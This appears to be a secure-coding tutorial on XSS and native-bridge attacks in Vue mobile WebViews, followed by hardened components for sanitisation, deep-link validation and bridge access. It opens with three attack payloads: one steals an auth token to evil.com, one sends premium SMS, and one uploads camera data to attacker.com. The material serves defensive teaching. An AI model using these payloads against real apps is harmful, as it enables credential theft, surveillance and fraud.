**Attack Payload**:
```html
<!-- XSS via v-html -->
<img src=x onerror="window.NativeBridge.getAuthToken().then(t=>fetch('https://evil.com/steal?token='+t))">

<!-- javascript: URL scheme attack -->
javascript:window.NativeBridge.sendSMS('premium-number','Subscribe')

<!-- Native bridge exploitation -->
<script>window.NativeBridge.accessCamera().then(data=>fetch('https://attacker.com/upload',{method:'POST',body:data}))</script>
```

**Why This Is Dangerous**:
- `v-html` renders any HTML/JavaScript without sanitization, enabling full XSS
- WebView JavaScript bridges expose native device APIs (camera, storage, SMS, auth tokens)
- Attackers can chain XSS with bridge access to completely compromise the device
- Deep links and custom URL schemes can inject malicious payloads
- No Content Security Policy enforcement in most mobile WebViews

**SECURE VERSION**:

```vue
<template>
  <div class="webview-content">
    <!-- SAFE: Use text interpolation for plain text -->
    <div class="user-post">{{ sanitizedContent }}</div>

    <!-- SAFE: Validated and sanitized HTML when needed -->
    <div 
      v-if="allowRichContent" 
      class="rich-content"
      v-html="sanitizedHtml"
    ></div>

    <!-- SAFE: Validated URL with allowlist -->
    <iframe 
      v-if="isValidEmbedUrl"
      :src="validatedUrl" 
      sandbox="allow-scripts allow-same-origin"
      class="embedded-content"
    ></iframe>

    <!-- SAFE: Sanitized href with protocol validation -->
    <a 
      :href="sanitizedLink" 
      @click="safeTrackClick"
      rel="noopener noreferrer"
    >{{ escapedLinkText }}</a>

    <!-- SAFE: Validated message to native bridge -->
    <button @click="safeShareToNative">Share</button>
  </div>
</template>

<script>
import DOMPurify from 'dompurify';
import { escapeHtml, validateUrl, sanitizeForBridge } from '@/utils/security';

// Configure DOMPurify for WebView context
DOMPurify.setConfig({
  ALLOWED_TAGS: ['b', 'i', 'em', 'strong', 'p', 'br', 'ul', 'ol', 'li'],
  ALLOWED_ATTR: ['class'],
  ALLOW_DATA_ATTR: false,
  USE_PROFILES: { html: true },
  FORBID_TAGS: ['script', 'iframe', 'object', 'embed', 'form'],
  FORBID_ATTR: ['onerror', 'onload', 'onclick', 'onmouseover', 'href', 'src']
});

const ALLOWED_EMBED_DOMAINS = [
  'youtube.com',
  'vimeo.com',
  'youtu.be'
];

const SAFE_URL_PROTOCOLS = ['https:'];

export default {
  name: 'SecureUserContentDisplay',
  props: {
    postContent: {
      type: String,
      required: true,
      validator: (v) => typeof v === 'string' && v.length < 50000
    },
    externalUrl: String,
    userLink: String,
    linkText: String,
    userMessage: String,
    allowRichContent: {
      type: Boolean,
      default: false
    }
  },
  computed: {
    sanitizedContent() {
      // Plain text - escape all HTML
      return escapeHtml(this.postContent);
    },
    sanitizedHtml() {
      // Rich content - use DOMPurify
      return DOMPurify.sanitize(this.postContent);
    },
    isValidEmbedUrl() {
      return this.validateEmbedUrl(this.externalUrl);
    },
    validatedUrl() {
      if (!this.isValidEmbedUrl) return '';
      return this.externalUrl;
    },
    sanitizedLink() {
      return this.validateAndSanitizeUrl(this.userLink);
    },
    escapedLinkText() {
      return escapeHtml(this.linkText || '');
    }
  },
  methods: {
    validateEmbedUrl(url) {
      if (!url) return false;
      try {
        const parsed = new URL(url);
        if (!SAFE_URL_PROTOCOLS.includes(parsed.protocol)) return false;
        return ALLOWED_EMBED_DOMAINS.some(domain => 
          parsed.hostname === domain || parsed.hostname.endsWith('.' + domain)
        );
      } catch {
        return false;
      }
    },
    validateAndSanitizeUrl(url) {
      if (!url) return '#';
      try {
        const parsed = new URL(url, window.location.origin);
        // Block dangerous protocols
        if (!['https:', 'http:', 'mailto:'].includes(parsed.protocol)) {
          console.warn('Blocked unsafe URL protocol:', parsed.protocol);
          return '#';
        }
        return parsed.href;
      } catch {
        return '#';
      }
    },
    safeTrackClick() {
      // Log sanitized data only
      const safeUrl = this.sanitizedLink;
      this.$emit('link-clicked', { url: safeUrl, timestamp: Date.now() });
    },
    safeShareToNative() {
      const sanitized = sanitizeForBridge(this.userMessage);
      if (window.NativeBridge && sanitized) {
        // Validate bridge exists and message is safe
        window.NativeBridge.share(sanitized);
      }
    }
  }
}
</script>
```

**Key Security Controls**:
- **DOMPurify sanitization**: Strips all dangerous tags, attributes, and event handlers before rendering HTML
- **URL validation with allowlists**: Only permits specific trusted domains for embedded content
- **Protocol validation**: Blocks `javascript:`, `data:`, and other dangerous URL schemes
- **iframe sandboxing**: Restricts iframe capabilities even for allowed domains
- **Native bridge input sanitization**: Validates and sanitizes all data before passing to native code

Deep link handling is one of the most critical attack vectors in mobile WebViews. The TikTok CVE-2022-28799 specifically exploited deep link parameters to achieve one-click account takeover. You need strict validation of all URL parameters and actions.

**PRODUCTION PATTERN**:

```vue
<template>
  <div class="app-container">
    <SecureContentRenderer
      v-if="currentView === 'content'"
      :content="safeContent"
      :allow-html="false"
    />

    <DeepLinkHandler
      ref="deepLinkHandler"
      @action-validated="handleValidatedAction"
      @security-violation="handleSecurityViolation"
    />

    <SecurityMonitor
      :enabled="isProduction"
      @suspicious-activity="reportToSecurityTeam"
    />
  </div>
</template>

<script>
import DOMPurify from 'dompurify';
import { createHash } from 'crypto-js';

// Security configuration for deep link handling
const DEEP_LINK_CONFIG = {
  scheme: 'myapp',
  allowedActions: new Set([
    'view-profile',
    'open-content', 
    'share',
    'settings'
  ]),
  parameterRules: {
    'view-profile': {
      required: ['userId'],
      optional: ['tab'],
      validators: {
        userId: (v) => /^[a-zA-Z0-9]{8,32}$/.test(v),
        tab: (v) => ['posts', 'likes', 'followers'].includes(v)
      }
    },
    'open-content': {
      required: ['contentId'],
      optional: ['timestamp'],
      validators: {
        contentId: (v) => /^[a-zA-Z0-9-]{36}$/.test(v),
        timestamp: (v) => !isNaN(parseInt(v)) && parseInt(v) > 0
      }
    },
    'share': {
      required: ['type'],
      optional: ['message'],
      validators: {
        type: (v) => ['text', 'image', 'link'].includes(v),
        message: (v) => typeof v === 'string' && v.length <= 280
      },
      sanitizers: {
        message: (v) => DOMPurify.sanitize(v, { ALLOWED_TAGS: [] })
      }
    }
  },
  maxParameterLength: 1000,
  rateLimitPerMinute: 30
};

// Secure native bridge wrapper
class SecureNativeBridge {
  constructor() {
    this.callHistory = [];
    this.rateLimitWindow = 60000; // 1 minute
    this.maxCallsPerWindow = 50;
  }

  isRateLimited() {
    const now = Date.now();
    this.callHistory = this.callHistory.filter(
      t => now - t < this.rateLimitWindow
    );
    return this.callHistory.length >= this.maxCallsPerWindow;
  }

  async callBridge(method, params) {
    if (this.isRateLimited()) {
      console.warn('Native bridge rate limited');
      throw new Error('RATE_LIMITED');
    }

    // Allowlist of safe bridge methods
    const allowedMethods = new Set([
      'share',
      'getDeviceId',
      'hapticFeedback',
      'openExternalLink'
    ]);

    if (!allowedMethods.has(method)) {
      console.error(`Blocked unauthorized bridge method: ${method}`);
      throw new Error('UNAUTHORIZED_METHOD');
    }

    // Sanitize all parameters
    const sanitizedParams = this.sanitizeParams(params);

    this.callHistory.push(Date.now());

    // Audit log
    this.logBridgeCall(method, sanitizedParams);

    if (window.NativeBridge && typeof window.NativeBridge[method] === 'function') {
      return window.NativeBridge[method](sanitizedParams);
    }

    throw new Error('BRIDGE_UNAVAILABLE');
  }

  sanitizeParams(params) {
    if (typeof params === 'string') {
      return DOMPurify.sanitize(params, { ALLOWED_TAGS: [] });
    }
    if (typeof params === 'object' && params !== null) {
      const sanitized = {};
      for (const [key, value] of Object.entries(params)) {
        if (typeof value === 'string') {
          sanitized[key] = DOMPurify.sanitize(value, { ALLOWED_TAGS: [] });
        } else if (typeof value === 'number' || typeof value === 'boolean') {
          sanitized[key] = value;
        }
      }
      return sanitized;
    }
    return params;
  }

  logBridgeCall(method, params) {
    const logEntry = {
      timestamp: new Date().toISOString(),
      method,
      paramsHash: createHash('sha256').update(JSON.stringify(params)).toString(),
      userAgent: navigator.userAgent
    };

    // Send to security monitoring
    if (window.__SECURITY_MONITOR__) {
      window.__SECURITY_MONITOR__.log('bridge_call', logEntry);
    }
  }
}

export default {
  name: 'SecureDeepLinkApp',
  data() {
    return {
      currentView: 'content',
      safeContent: '',
      isProduction: process.env.NODE_ENV === 'production',
      deepLinkAttempts: [],
      nativeBridge: new SecureNativeBridge()
    };
  },
  created() {
    // Listen for deep links
    this.setupDeepLinkListener();

    // Configure CSP via meta tag for WebView
    this.injectSecurityHeaders();
  },
  methods: {
    setupDeepLinkListener() {
      // Handle deep links from native layer
      window.handleDeepLink = (url) => {
        this.processDeepLink(url);
      };

      // Handle web-based deep links
      window.addEventListener('message', (event) => {
        // Validate origin
        if (!this.isValidMessageOrigin(event.origin)) {
          this.reportSecurityViolation('invalid_message_origin', { origin: event.origin });
          return;
        }

        if (event.data?.type === 'deeplink') {
          this.processDeepLink(event.data.url);
        }
      });
    },

    isValidMessageOrigin(origin) {
      const allowedOrigins = [
        'https://myapp.com',
        'https://www.myapp.com',
        'file://' // For local WebView
      ];
      return allowedOrigins.includes(origin);
    },

    processDeepLink(url) {
      const startTime = performance.now();

      try {
        // Rate limiting
        if (!this.checkDeepLinkRateLimit()) {
          this.reportSecurityViolation('rate_limit_exceeded', { url: '[redacted]' });
          return;
        }

        // Parse and validate URL
        const parsed = this.parseDeepLink(url);
        if (!parsed) {
          this.reportSecurityViolation('invalid_deeplink_format', { url: '[redacted]' });
          return;
        }

        // Validate action
        if (!DEEP_LINK_CONFIG.allowedActions.has(parsed.action)) {
          this.reportSecurityViolation('unauthorized_action', { action: parsed.action });
          return;
        }

        // Validate and sanitize parameters
        const validatedParams = this.validateParameters(parsed.action, parsed.params);
        if (!validatedParams.valid) {
          this.reportSecurityViolation('invalid_parameters', {
            action: parsed.action,
            errors: validatedParams.errors
          });
          return;
        }

        // Execute validated action
        this.executeAction(parsed.action, validatedParams.sanitized);

        // Audit log successful deep link
        this.logDeepLinkProcessed(parsed.action, performance.now() - startTime);

      } catch (error) {
        console.error('Deep link processing error:', error.message);
        this.reportSecurityViolation('processing_error', { error: error.message });
      }
    },

    parseDeepLink(url) {
      try {
        // Validate URL length
        if (url.length > 2048) {
          return null;
        }

        const parsed = new URL(url);

        // Validate scheme
        if (parsed.protocol !== `${DEEP_LINK_CONFIG.scheme}:`) {
          return null;
        }

        const action = parsed.hostname;
        const params = {};

        // Parse and validate each parameter
        for (const [key, value] of parsed.searchParams) {
          // Check parameter length
          if (value.length > DEEP_LINK_CONFIG.maxParameterLength) {
            return null;
          }

          // Only allow alphanumeric keys
          if (!/^[a-zA-Z][a-zA-Z0-9_]*$/.test(key)) {
            return null;
          }

          params[key] = value;
        }

        return { action, params };
      } catch {
        return null;
      }
    },

    validateParameters(action, params) {
      const rules = DEEP_LINK_CONFIG.parameterRules[action];
      if (!rules) {
        return { valid: false, errors: ['No rules defined for action'] };
      }

      const errors = [];
      const sanitized = {};

      // Check required parameters
      for (const required of rules.required || []) {
        if (!(required in params)) {
          errors.push(`Missing required parameter: ${required}`);
        }
      }

      // Validate and sanitize each parameter
      const allAllowedParams = [...(rules.required || []), ...(rules.optional || [])];

      for (const [key, value] of Object.entries(params)) {
        // Reject unexpected parameters
        if (!allAllowedParams.includes(key)) {
          errors.push(`Unexpected parameter: ${key}`);
          continue;
        }

        // Run validator
        const validator = rules.validators?.[key];
        if (validator && !validator(value)) {
          errors.push(`Invalid value for parameter: ${key}`);
          continue;
        }

        // Apply sanitizer or default sanitization
        const sanitizer = rules.sanitizers?.[key];
        sanitized[key] = sanitizer ? sanitizer(value) : this.defaultSanitize(value);
      }

      return {
        valid: errors.length === 0,
        errors,
        sanitized
      };
    },

    defaultSanitize(value) {
      // Remove any potential script injection
      return DOMPurify.sanitize(value, { ALLOWED_TAGS: [] })
        .replace(/[<>"'&]/g, '');
    },

    checkDeepLinkRateLimit() {
      const now = Date.now();
      const windowMs = 60000; // 1 minute

      this.deepLinkAttempts = this.deepLinkAttempts.filter(
        t => now - t < windowMs
      );

      if (this.deepLinkAttempts.length >= DEEP_LINK_CONFIG.rateLimitPerMinute) {
        return false;
      }

      this.deepLinkAttempts.push(now);
      return true;
    },

    executeAction(action, params) {
      const actionHandlers = {
        'view-profile': () => this.$router.push({
          name: 'Profile',
          params: { userId: params.userId },
          query: params.tab ? { tab: params.tab } : {}
        }),
        'open-content': () => this.$router.push({
          name: 'Content',
          params: { id: params.contentId }
        }),
        'share': async () => {
          await this.nativeBridge.callBridge('share', {
            type: params.type,
            message: params.message || ''
          });
        },
        'settings': () => this.$router.push({ name: 'Settings' })
      };

      const handler = actionHandlers[action];
      if (handler) {
        handler();
      }
    },

    injectSecurityHeaders() {
      // Add CSP meta tag for WebView
      const cspMeta = document.createElement('meta');
      cspMeta.httpEquiv = 'Content-Security-Policy';
      cspMeta.content = [
        "default-src 'self'",
        "script-src 'self' 'unsafe-inline'", // Required for Vue
        "style-src 'self' 'unsafe-inline'",
        "img-src 'self' https: data:",
        "connect-src 'self' https://api.myapp.com",
        "frame-ancestors 'none'",
        "base-uri 'self'",
        "form-action 'self'"
      ].join('; ');
      document.head.appendChild(cspMeta);
    },

    handleValidatedAction(action) {
      console.log('Validated action:', action);
    },

    handleSecurityViolation(violation) {
      this.reportSecurityViolation('component_violation', violation);
    },

    reportSecurityViolation(type, details) {
      const report = {
        type,
        timestamp: new Date().toISOString(),
        details: JSON.stringify(details).substring(0, 500),
        userAgent: navigator.userAgent,
        url: window.location.href
      };

      // Send to security monitoring endpoint
      if (this.isProduction) {
        fetch('https://api.myapp.com/security/violations', {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify(report)
        }).catch(() => {});
      }

      console.warn('Security violation:', type, details);
    },

    logDeepLinkProcessed(action, processingTime) {
      if (this.isProduction) {
        fetch('https://api.myapp.com/analytics/deeplink', {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({
            action,
            processingTime,
            timestamp: new Date().toISOString()
          })
        }).catch(() => {});
      }
    },

    reportToSecurityTeam(event) {
      console.error('Suspicious activity detected:', event);
    }
  }
}
</script>
```

**Defense in Depth Layers**:

1. **URL Scheme Validation**: Only accept URLs matching the expected `myapp://` scheme with strict parsing
```javascript
if (parsed.protocol !== `${DEEP_LINK_CONFIG.scheme}:`) {
  return null; // Reject all other schemes
}
```

2. **Action Allowlisting**: Explicit allowlist of permitted actions, rejecting anything not in the set
```javascript
if (!DEEP_LINK_CONFIG.allowedActions.has(parsed.action)) {
  this.reportSecurityViolation('unauthorized_action', { action: parsed.action });
  return;
}
```

3. **Parameter Validation with Type-Specific Rules**: Each action has defined required/optional parameters with validators
```javascript
const validator = rules.validators?.[key];
if (validator && !validator(value)) {
  errors.push(`Invalid value for parameter: ${key}`);
}
```

**Additional Protections**:
- **Rate limiting**: Maximum 30 deep links per minute to prevent automated attacks
- **Secure native bridge wrapper**: Allowlisted methods, rate limiting, and audit logging for all bridge calls
- **Message origin validation**: Only accepts postMessage from trusted origins
- **CSP injection**: Adds Content-Security-Policy meta tag to restrict resource loading
- **Security violation reporting**: All rejected requests are logged and sent to security monitoring
- **Parameter length limits**: Prevents buffer overflow and DoS via oversized parameters
- **Audit logging**: All successful deep links are logged with timing information for anomaly detection

